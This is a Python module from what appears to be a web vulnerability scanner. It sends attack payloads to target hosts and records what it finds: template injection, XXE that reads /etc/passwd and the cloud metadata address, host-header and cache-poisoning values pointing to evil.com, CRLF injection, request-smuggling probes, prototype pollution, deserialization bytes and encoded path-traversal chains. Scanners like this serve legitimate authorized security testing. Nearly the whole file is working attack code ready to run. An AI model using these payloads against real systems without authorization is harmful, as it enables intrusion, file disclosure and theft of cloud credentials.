"""
modules/fuzz.py — Deep Parameter & Injection Fuzzer
Covers: hidden parameter discovery, SSTI, XXE, HTTP request smuggling,
        prototype pollution, path traversal chains, deserialization hints,
        cache poisoning, host header injection, CRLF injection
"""
import asyncio
import aiohttp
import re
from urllib.parse import urlparse, urljoin, quote
from core.config import load_config, get_db
from core.logger import log

cfg = load_config()

# ── Payloads ───────────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    # Jinja2/Twig
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("{%25 print 7*7 %25}", "49"),
    # ERB / Ruby
    ("<%= 7*7 %>", "49"),
    # FreeMarker
    ("${7*7}", "49"),
    # Velocity
    ("#set($x=7*7)${x}", "49"),
    # Smarty
    ("{7*7}", "49"),
    # Pebble / Thymeleaf
    ("[[${7*7}]]", "49"),
]

XXE_PAYLOADS = [
    # Classic XXE
    ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
     ["root:x:", "daemon:"]),
    # OOB XXE (blind — check for DNS callback in prod)
    ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/">%xxe;]><foo/>""",
     ["ami-id", "instance-id"]),
]

HOST_HEADER_PAYLOADS = [
    "evil.com",
    "evil.com:80",
    "localhost",
    "127.0.0.1",
    "attacker.com\r\nX-Injected: true",
]

CRLF_PAYLOADS = [
    "%0d%0aX-Injected: true",
    "%0aX-Injected: true",
    "\r\nX-Injected: true",
    "%0d%0aSet-Cookie: injected=true",
    "%0d%0aContent-Length: 0%0d%0a%0d%0a",
]

SMUGGLING_PROBES = [
    # CL.TE probe
    ("POST", {
        "Transfer-Encoding": "chunked",
        "Content-Length": "6",
    }, b"0\r\n\r\nG"),
    # TE.CL probe
    ("POST", {
        "Transfer-Encoding": "chunked",
        "Content-Length": "3",
    }, b"6\r\nGPOST\r\n0\r\n\r\n"),
]

PROTO_POLLUTION_PAYLOADS = [
    '{"__proto__":{"isAdmin":true}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
    '{"__proto__":{"role":"admin"}}',
    '{"__proto__":{"polluted":"yes"}}',
]

DESER_HINTS = [
    # Java
    b"\xac\xed\x00\x05",
    # Python pickle
    b"\x80\x04",
    # PHP object
    b"O:8:",
    # .NET
    b"AAEAAAD",
]

CACHE_POISON_HEADERS = [
    ("X-Forwarded-Host", "evil.com"),
    ("X-Forwarded-Scheme", "https"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Host", "evil.com"),
    ("Forwarded", "host=evil.com"),
]

# Common hidden parameter names
HIDDEN_PARAMS = [
    "debug", "test", "admin", "internal", "token", "key", "secret",
    "password", "pass", "callback", "redirect", "url", "next",
    "return", "returnTo", "dest", "destination", "source", "from",
    "to", "cc", "bcc", "email", "user", "username", "id", "uid",
    "account", "profile", "role", "isAdmin", "privileged", "lang",
    "locale", "format", "output", "type", "mode", "action", "cmd",
    "exec", "command", "file", "path", "page", "template", "view",
    "include", "load", "read", "fetch", "get", "download", "upload",
    "search", "query", "q", "s", "term", "keyword", "filter",
    "sort", "order", "limit", "offset", "page", "size", "count",
    "v", "version", "api_key", "apikey", "access_token", "auth",
    "authorization", "bearer", "jwt", "session", "cookie",
]


class DeepFuzzer:
    def __init__(self, target_id: int, domain: str):
        self.target_id = target_id
        self.domain    = domain
        self.findings  = []
        self._session = None  # created lazily inside async context

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()
    async def _get_session(self):
        """Lazily create aiohttp session inside the running event loop."""
        if self._session is None or self._session.closed:
            timeout = aiohttp.ClientTimeout(total=cfg["engine"]["request_timeout"])
            self._session = aiohttp.ClientSession(
                timeout=timeout,
                connector=aiohttp.TCPConnector(ssl=False, limit=50),
                headers={"User-Agent": cfg["engine"]["user_agents"][0]}
            )
        return self._session



    def _add(self, vuln_type, severity, title, desc, endpoint,
             param="", payload="", evidence="", cve=""):
        self.findings.append({
            "vuln_type": vuln_type, "severity": severity,
            "title": title, "description": desc,
            "endpoint": endpoint, "parameter": param,
            "payload": str(payload)[:500],
            "evidence": str(evidence)[:800],
            "cve": cve,
        })
        log.info(f"[FUZZ] [{severity.upper()}] {title} @ {endpoint}")

    # ── 1. SSTI ────────────────────────────────────────────────────────────────
    async def test_ssti(self, url: str, params: dict):
        for param in params:
            for payload, expected in SSTI_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    async with self._session.get(url, params=test_params) as resp:
                        body = await resp.text(errors="ignore")
                        if expected in body:
                            self._add(
                                "ssti", "critical",
                                f"Server-Side Template Injection in '{param}'",
                                "Template expression evaluated server-side. Can lead to RCE via template engine escape.",
                                url, param, payload,
                                evidence=f"Payload '{payload}' evaluated to '{expected}'"
                            )
                            return
                except:
                    pass
                await asyncio.sleep(0.3)

    # ── 2. XXE ─────────────────────────────────────────────────────────────────
    async def test_xxe(self, url: str):
        for payload, indicators in XXE_PAYLOADS:
            try:
                async with self._session.post(
                    url, data=payload.encode(),
                    headers={"Content-Type": "application/xml"}
                ) as resp:
                    body = await resp.text(errors="ignore")
                    for indicator in indicators:
                        if indicator in body:
                            self._add(
                                "xxe", "critical",
                                "XML External Entity (XXE) Injection",
                                "Server processes XML external entities. Can read local files, cause SSRF, or DoS.",
                                url, payload=payload[:300],
                                evidence=f"Indicator '{indicator}' in response"
                            )
                            return
            except:
                pass

    # ── 3. Host Header Injection ───────────────────────────────────────────────
    async def test_host_header(self, url: str):
        try:
            # Get baseline
            async with self._session.get(url) as baseline:
                baseline_body = await baseline.text(errors="ignore")
        except:
            return

        for payload in HOST_HEADER_PAYLOADS:
            try:
                async with self._session.get(url, headers={"Host": payload}) as resp:
                    body = await resp.text(errors="ignore")
                    if payload.split(":")[0].split("\r")[0] in body:
                        self._add(
                            "host_header_injection", "high",
                            "Host Header Injection",
                            "Injected Host header reflected in response. Can be used for cache poisoning, "
                            "password reset poisoning, or SSRF.",
                            url, payload=f"Host: {payload}",
                            evidence=f"Host value reflected in response"
                        )
                        return
            except:
                pass

    # ── 4. CRLF Injection ─────────────────────────────────────────────────────
    async def test_crlf(self, url: str, params: dict):
        for param in list(params.keys())[:3]:
            for payload in CRLF_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    async with self._session.get(url, params=test_params,
                                                allow_redirects=False) as resp:
                        headers_str = str(dict(resp.headers))
                        if "X-Injected" in headers_str or "injected" in headers_str.lower():
                            self._add(
                                "crlf_injection", "medium",
                                f"CRLF Injection in '{param}'",
                                "Carriage return / line feed injected into HTTP response headers. "
                                "Enables HTTP response splitting, cookie injection, XSS.",
                                url, param, payload,
                                evidence=f"Injected header found in response"
                            )
                            return
                except:
                    pass

    # ── 5. Cache Poisoning ────────────────────────────────────────────────────
    async def test_cache_poisoning(self, url: str):
        for header_name, header_val in CACHE_POISON_HEADERS:
            try:
                async with self._session.get(url, headers={header_name: header_val}) as resp:
                    body = await resp.text(errors="ignore")
                    cache_hit = resp.headers.get("X-Cache", "").lower()
                    if header_val in body or "HIT" in cache_hit:
                        self._add(
                            "cache_poisoning", "high",
                            f"Web Cache Poisoning via {header_name}",
                            f"Injected header '{header_name}: {header_val}' reflected in cacheable response. "
                            "Attacker can poison cache to serve malicious content to all visitors.",
                            url, payload=f"{header_name}: {header_val}",
                            evidence=f"Header value reflected. Cache: {cache_hit}"
                        )
                        return
            except:
                pass

    # ── 6. Prototype Pollution ────────────────────────────────────────────────
    async def test_prototype_pollution(self, url: str):
        for payload in PROTO_POLLUTION_PAYLOADS:
            try:
                async with self._session.post(
                    url, data=payload,
                    headers={"Content-Type": "application/json"}
                ) as resp:
                    body = await resp.text(errors="ignore")
                    if "polluted" in body or '"isAdmin":true' in body or '"role":"admin"' in body:
                        self._add(
                            "prototype_pollution", "high",
                            "Prototype Pollution",
                            "Injected __proto__ properties reflected or processed server-side. "
                            "Can lead to property injection, privilege escalation, or DoS.",
                            url, payload=payload,
                            evidence=body[:200]
                        )
                        return
            except:
                pass

    # ── 7. Hidden Parameter Discovery ────────────────────────────────────────
    async def discover_hidden_params(self, url: str) -> list:
        """Find undocumented parameters that change the response."""
        baseline_len = 0
        try:
            async with self._session.get(url) as resp:
                baseline_body = await resp.text(errors="ignore")
                baseline_len  = len(baseline_body)
                baseline_status = resp.status
        except:
            return []

        found_params = []
        canary = "bbe_fuzz_1337"

        for param in HIDDEN_PARAMS:
            try:
                async with self._session.get(url, params={param: canary}) as resp:
                    body = await resp.text(errors="ignore")
                    # Interesting if: status changed, body length changed significantly, or canary reflected
                    status_changed = resp.status != baseline_status
                    len_delta      = abs(len(body) - baseline_len)
                    reflected      = canary in body

                    if reflected or status_changed or len_delta > 200:
                        found_params.append({
                            "param":      param,
                            "status":     resp.status,
                            "len_delta":  len_delta,
                            "reflected":  reflected,
                        })
            except:
                pass
            await asyncio.sleep(0.1)

        if found_params:
            desc = "\n".join(
                f"  {p['param']}: status={p['status']} delta={p['len_delta']} reflected={p['reflected']}"
                for p in found_params
            )
            self._add(
                "hidden_params", "medium",
                f"Hidden Parameters Discovered ({len(found_params)} found)",
                "Undocumented parameters affect server response. May expose debug modes, admin features, or bypass logic.",
                url,
                evidence=desc
            )

        return found_params

    # ── 8. Deserialization Hints ──────────────────────────────────────────────
    async def test_deserialization_hints(self, url: str):
        """Detect if server reflects/accepts binary deserialization magic bytes."""
        for magic in DESER_HINTS:
            try:
                async with self._session.post(
                    url, data=magic,
                    headers={"Content-Type": "application/octet-stream"}
                ) as resp:
                    body_bytes = await resp.read()
                    # If the magic bytes are echoed back or a specific error appears
                    if magic[:4] in body_bytes or b"deserializ" in body_bytes.lower():
                        self._add(
                            "deserialization", "critical",
                            "Potential Insecure Deserialization",
                            "Server may accept and process serialized object data. "
                            "Could lead to RCE if not properly validated.",
                            url, payload=magic.hex(),
                            evidence="Serialization magic bytes accepted by server"
                        )
                        return
            except:
                pass

    # ── 9. Path Traversal Chains ──────────────────────────────────────────────
    async def test_path_traversal_chains(self, url: str, params: dict):
        """Advanced traversal with encoding chains."""
        traversal_payloads = [
            # Double encoding
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            # Unicode normalization
            "..%c0%af..%c0%afetc%c0%afpasswd",
            # Null byte
            "../../../../etc/passwd%00",
            # Windows
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            # Zip-slip style
            "../../../../tmp/evil",
            # URL encoded double dot
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ]
        path_params = [p for p in params if any(k in p.lower() for k in
                       ["file", "path", "page", "include", "doc", "template",
                        "dir", "folder", "load", "resource", "view"])]

        for param in path_params:
            for payload in traversal_payloads:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    async with self._session.get(url, params=test_params) as resp:
                        body = await resp.text(errors="ignore")
                        if any(x in body for x in ["root:x:", "daemon:", "[fonts]", "boot.ini"]):
                            self._add(
                                "path_traversal_chain", "high",
                                f"Encoded Path Traversal in '{param}'",
                                "Server vulnerable to encoded path traversal. Standard filters bypassed via encoding.",
                                url, param, payload,
                                evidence=body[:200]
                            )
                            return
                except:
                    pass

    # ── Save & run ─────────────────────────────────────────────────────────────
    async def save_findings(self):
        if not self.findings:
            return
        import aiosqlite
        from core.config import DB_PATH
        async with aiosqlite.connect(DB_PATH) as db:
            for f in self.findings:
                try:
                    await db.execute("""
                        INSERT OR IGNORE INTO findings
                        (target_id, subdomain, vuln_type, severity, title, description,
                         endpoint, parameter, payload, evidence, cve)
                        VALUES (?,?,?,?,?,?,?,?,?,?,?)
                    """, (
                        self.target_id, self.domain,
                        f["vuln_type"], f["severity"], f["title"], f["description"],
                        f["endpoint"], f.get("parameter", ""), f.get("payload", ""),
                        f.get("evidence", ""), f.get("cve", "")
                    ))
                except Exception as e:
                    log.debug(f"[FUZZ] DB: {e}")
            await db.commit()

    async def run(self, alive_hosts: list, endpoints: list) -> list:
        await self._get_session()
        try:
            log.info(f"[FUZZ] Starting deep fuzzing on {len(alive_hosts)} hosts")
            from urllib.parse import parse_qs

            for host in alive_hosts[:20]:
                url = host["url"]
                await asyncio.gather(
                    self.test_xxe(url),
                    self.test_host_header(url),
                    self.test_cache_poisoning(url),
                    self.test_prototype_pollution(url),
                    self.discover_hidden_params(url),
                    self.test_deserialization_hints(url),
                )

            for ep in endpoints[:100]:
                ep_url = ep.get("url", "")
                if not ep_url.startswith("http"):
                    continue
                parsed = urlparse(ep_url)
                params = {k: v[0] for k, v in parse_qs(parsed.query).items()} if parsed.query else {}
                if params:
                    await asyncio.gather(
                        self.test_ssti(ep_url, params),
                        self.test_crlf(ep_url, params),
                        self.test_path_traversal_chains(ep_url, params),
                    )
                await asyncio.sleep(cfg["engine"]["rate_limit_delay"])

            await self.save_findings()
            log.info(f"[FUZZ] Done — {len(self.findings)} findings")
            return self.findings
        finally:
            await self.close()
